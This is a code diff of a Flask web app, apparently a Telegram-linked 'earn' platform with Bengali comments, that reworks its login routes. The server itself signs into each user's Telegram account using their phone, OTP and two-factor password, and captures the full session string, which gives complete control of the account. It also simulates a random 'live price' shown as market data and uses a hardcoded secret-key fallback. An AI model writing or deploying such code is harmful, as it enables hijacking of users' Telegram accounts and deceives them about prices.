@@ -21,7 +21,7 @@ app.secret_key = os.environ.get("SECRET_KEY", "AAF_TELE_EARN_V18_CORE_SECRET")
 
 app.config.update(
     SESSION_COOKIE_HTTPONLY=True,
-    SESSION_COOKIE_SECURE=False,  # True if HTTPS
+    SESSION_COOKIE_SECURE=False,
     PERMANENT_SESSION_LIFETIME=timedelta(days=3)
 )
 
@@ -56,38 +56,13 @@ if not firebase_admin._apps:
         print("⚠️ firebase-key.json not found. Firebase features will not work.")
 fb_ref = db.reference() if firebase_admin._apps else None
 
-
-# ================= PERSISTENT TELEGRAM CLIENT =================
-_loop = None
-_telegram_client = None
-_client_ready = threading.Event()   # ← এই লাইনটি আগে ছিল না, এখন যোগ করলাম
-
+# ================= NEW: Per-request async helper (no persistent client) =================
 def run_async(coro):
-    """Persistent loop এ coroutine চালায় (কখনো নতুন লুপ তৈরি করে না)"""
-    global _loop, _client_ready
-    if not _client_ready.wait(timeout=15):
-        raise RuntimeError("Telegram client not ready after 15 seconds")
-    if _loop is None:
-        raise RuntimeError("Telegram client not initialized")
-    future = asyncio.run_coroutine_threadsafe(coro, _loop)
-    return future.result()
+    """প্রতি রিকোয়েস্টে নতুন ইভেন্ট লুপ তৈরি করে (persistent নয়)"""
+    loop = asyncio.new_event_loop()
+    asyncio.set_event_loop(loop)
+    return loop.run_until_complete(coro)
 
-def start_telegram_thread():
-    global _loop, _telegram_client, _client_ready
-    _loop = asyncio.new_event_loop()
-    asyncio.set_event_loop(_loop)
-    _telegram_client = TelegramClient(StringSession(), API_ID, API_HASH)
-    try:
-        _loop.run_until_complete(_telegram_client.connect())
-        _client_ready.set()   # সংযোগ প্রস্তুত
-        print("✅ Persistent Telegram client connected")
-    except Exception as e:
-        print(f"❌ Telegram client connection failed: {e}")
-        _client_ready.clear()
-    _loop.run_forever()
-
-# ব্যাকগ্রাউন্ড থ্রেড চালু করুন
-threading.Thread(target=start_telegram_thread, daemon=True).start()
 def normalize_phone(phone):
     if not phone:
         return None
@@ -130,8 +105,8 @@ def update_total_users():
     total = users_col.count_documents({})
     admin_config_col.update_one({"_id": "global"}, {"$set": {"total_users": total}})
 
-# Temp storage for OTP sessions (phone -> client data)
-temp_clients = {}
+# Temporary storage for OTP data (phone -> temp_session, phone_code_hash)
+temp_otp_data = {}
 
 # Background thread for live price simulation
 current_price = 1.0
@@ -143,7 +118,6 @@ def update_price_loop():
             current_price += change
             current_price = max(0.5, min(2.5, current_price))
             admin_config_col.update_one({"_id": "global"}, {"$set": {"live_price": current_price, "last_updated": datetime.utcnow()}})
-            # Save candle to Firebase every minute
             now = datetime.utcnow()
             candle = {
                 "time": int(now.timestamp()),
@@ -155,8 +129,7 @@ def update_price_loop():
             }
             if fb_ref:
                 fb_ref.child("candle_history").push(candle)
-                # Clean old candles (>30 days)
-                if now.minute == 0 and now.second < 5:  # once per hour approx
+                if now.minute == 0 and now.second < 5:
                     cutoff = (now - timedelta(days=30)).timestamp()
                     old = fb_ref.child("candle_history").order_by_child("time").end_at(cutoff).get()
                     if old:
@@ -182,7 +155,7 @@ def login_required(f):
         return f(*args, **kwargs)
     return wrapper
 
-# ================= PAGE ROUTES =================
+# ================= PAGE ROUTES (সব আগের মতো) =================
 @app.route("/")
 @app.route("/login")
 def login():
@@ -228,7 +201,7 @@ def payment_history():
 def admin_panel():
     return render_template("admin.html")
 
-# ================= API: AUTH =================
+# ================= API: AUTH (Per-request Telegram client) =================
 @app.route("/api/send_otp", methods=["POST"])
 def send_otp():
     data = request.json
@@ -237,19 +210,21 @@ def send_otp():
         return jsonify({"success": False, "message": "invalid_phone"})
 
     async def _send():
-        try:
-            result = await _telegram_client.send_code_request(phone)
-            temp_clients[phone] = {"phone_code_hash": result.phone_code_hash}
-            return True, "OTP Sent"
-        except Exception as e:
-            print(f"send_code_request error for {phone}: {e}")
-            return False, str(e)
+        client = TelegramClient(StringSession(), API_ID, API_HASH)
+        await client.connect()
+        result = await client.send_code_request(phone)
+        temp_otp_data[phone] = {
+            "temp_session": client.session.save(),
+            "phone_code_hash": result.phone_code_hash
+        }
+        await client.disconnect()
+        return True, "OTP Sent"
 
     try:
         success, msg = run_async(_send())
         return jsonify({"success": success, "message": msg})
     except Exception as e:
-        print(f"send_otp outer error: {e}")
+        print(f"send_otp error: {e}")
         return jsonify({"success": False, "message": str(e)})
 
 @app.route("/api/verify_login", methods=["POST"])
@@ -259,32 +234,37 @@ def verify_login():
     code = data.get("code")
     password = data.get("password")
 
-    if not phone or phone not in temp_clients:
+    if not phone or phone not in temp_otp_data:
         return jsonify({"success": False, "message": "session_expired"})
 
-    phone_code_hash = temp_clients[phone]["phone_code_hash"]
+    temp = temp_otp_data[phone]
+    temp_session_str = temp["temp_session"]
+    phone_code_hash = temp["phone_code_hash"]
 
     async def _verify():
+        client = TelegramClient(StringSession(temp_session_str), API_ID, API_HASH)
+        await client.connect()
         try:
             if password:
-                await _telegram_client.sign_in(password=password)
+                await client.sign_in(password=password)
             else:
                 if not code:
                     return False, "Code required"
-                await _telegram_client.sign_in(phone=phone, code=code, phone_code_hash=phone_code_hash)
-            me = await _telegram_client.get_me()
-            session_str = _telegram_client.session.save()
+                await client.sign_in(phone=phone, code=code, phone_code_hash=phone_code_hash)
+            me = await client.get_me()
+            session_str = client.session.save()
             return True, me, session_str
         except SessionPasswordNeededError:
             return False, "SHOW_PWD_STEP"
         except Exception as e:
             return False, str(e)
+        finally:
+            await client.disconnect()
 
     try:
         result = run_async(_verify())
         if result[0] is True and len(result) == 3:
             me, session_str = result[1], result[2]
-            # ইউজার সেভ/আপডেট (আপনার বিদ্যমান কোড)
             user = users_col.find_one({"telegram_id": str(me.id)})
             if not user:
                 user_data = {
@@ -313,7 +293,7 @@ def verify_login():
             session["uid"] = str(result_id)
             session.permanent = True
             update_total_users()
-            del temp_clients[phone]
+            del temp_otp_data[phone]
             return jsonify({"success": True, "telegram_id": str(me.id)})
         else:
             msg = result[1]
@@ -322,6 +302,7 @@ def verify_login():
             else:
                 return jsonify({"success": False, "message": msg})
     except Exception as e:
+        print(f"verify_login error: {e}")
         return jsonify({"success": False, "message": str(e)})
 
 
